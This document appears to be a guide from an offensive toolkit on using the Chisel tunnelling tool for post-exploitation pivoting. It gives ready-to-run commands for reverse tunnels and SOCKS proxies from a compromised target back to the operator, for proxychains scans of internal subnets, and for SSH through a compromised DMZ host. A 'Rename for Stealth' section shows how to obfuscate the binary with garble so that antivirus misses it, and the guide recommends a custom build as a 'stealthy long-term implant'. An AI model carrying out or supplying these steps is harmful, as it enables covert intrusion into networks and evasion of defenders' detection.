# Chisel — Fast TCP/UDP Tunnel over HTTP

Chisel is a battle-tested Go tool that does everything `tunnel.py` does and more.
Use it when you want a proven, reliable binary you didn't have to write.
Use `tunnel.go` when you want a custom binary with a non-suspicious name.

---

## Download

```bash
# From GitHub releases — pick the right binary for your OS/arch
https://github.com/jpillora/chisel/releases/latest

# Linux (your machine)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64 && mv chisel_linux_amd64 chisel

# Windows target — download the .exe
# chisel_windows_amd64.gz → unzip → chisel.exe
```

Or build from source:
```bash
go install github.com/jpillora/chisel@latest
```

---

## Architecture

```
Your machine (chisel server)   ←──HTTP/WS──   Target (chisel client)
```

The client always initiates the connection outbound to the server over HTTP/WebSocket.
This means the target only needs outbound HTTP — no inbound firewall rules on target.
All tunnels are multiplexed over a single connection.

---

## Common Scenarios

### Scenario 1 — Forward a port on the target to you (reverse forward)

Use when: you have a shell on the target and want to reach an internal service from your machine.

```bash
# On YOUR machine — start server
./chisel server --port 8000 --reverse

# On TARGET — connect and set up the tunnel
./chisel client YOUR_IP:8000 R:8888:192.168.1.100:80
#                                ^local port  ^internal target
```

Now: `curl http://localhost:8888/` on your machine hits `192.168.1.100:80` on the target network.

### Scenario 2 — SOCKS5 proxy through target

Use when: you want to route all traffic (nmap, browser, etc.) through the target.

```bash
# On YOUR machine
./chisel server --port 8000 --reverse

# On TARGET
./chisel client YOUR_IP:8000 R:1080:socks
```

Now: configure proxychains to `socks5 127.0.0.1 1080`

```bash
proxychains nmap -sT -Pn -p 22,80,443 192.168.1.0/24
proxychains curl http://192.168.1.10/
```

### Scenario 3 — Forward your local port to target (local forward)

Use when: the target is a server you can reach directly, and you want to forward to a port on it.

```bash
# On YOUR machine — server
./chisel server --port 8000

# On TARGET — client, forward target's port 3389 to your machine's 13389
./chisel client YOUR_IP:8000 13389:localhost:3389
```

Now: `mstsc /v:localhost:13389` on your machine = RDP to the target.

### Scenario 4 — Pivot through a DMZ host to a deeper network

```
Your machine → DMZ host (compromised) → Internal network (10.10.10.0/24)
```

```bash
# Step 1: On your machine — start chisel server
./chisel server --port 8000 --reverse

# Step 2: On DMZ host — connect back + expose SOCKS proxy
./chisel client YOUR_IP:8000 R:1080:socks

# Step 3: On your machine — route through proxy
proxychains nmap -sT -Pn -p 22,80,3389 10.10.10.0/24
# Found 10.10.10.50:22 open — now pivot further

# Step 4: SSH through proxychains to internal host
proxychains ssh user@10.10.10.50
```

---

## Useful Flags

| Flag | Effect |
|------|--------|
| `--reverse` | Allow clients to create reverse tunnels (required for R: tunnels) |
| `--auth user:pass` | Require auth from clients |
| `--tls-key/--tls-cert` | Use TLS (encrypts traffic) |
| `--pid` | Write PID file |
| `--keepalive 10s` | Send keepalives every 10s |
| `--max-retry-count 3` | Stop retrying after 3 failures |
| `--proxy http://...` | Use HTTP proxy for outbound |

---

## Rename for Stealth

Chisel is a well-known tool and its binary is detected by some AV by name/hash.
Rename it and/or rebuild with garble:

```bash
# Clone and build with garble
git clone https://github.com/jpillora/chisel
cd chisel
go install mvdan.cc/garble@latest

# Linux
garble -tiny build -o netmon .

# Windows
GOOS=windows GOARCH=amd64 garble -tiny build -o netmon.exe .
```

---

## vs tunnel.go

| | Chisel | tunnel.go |
|--|--------|-----------|
| Binary name | `chisel` / easily renamed | Anything you want from the start |
| Known tool hash | Yes — flagged by some AV | No — unique per build |
| Features | More (auth, TLS, multiplexing) | Basic (forward, bind, socks5) |
| Garble support | Yes | Yes |
| Best for | Quick deployment | Stealthy long-term implant |
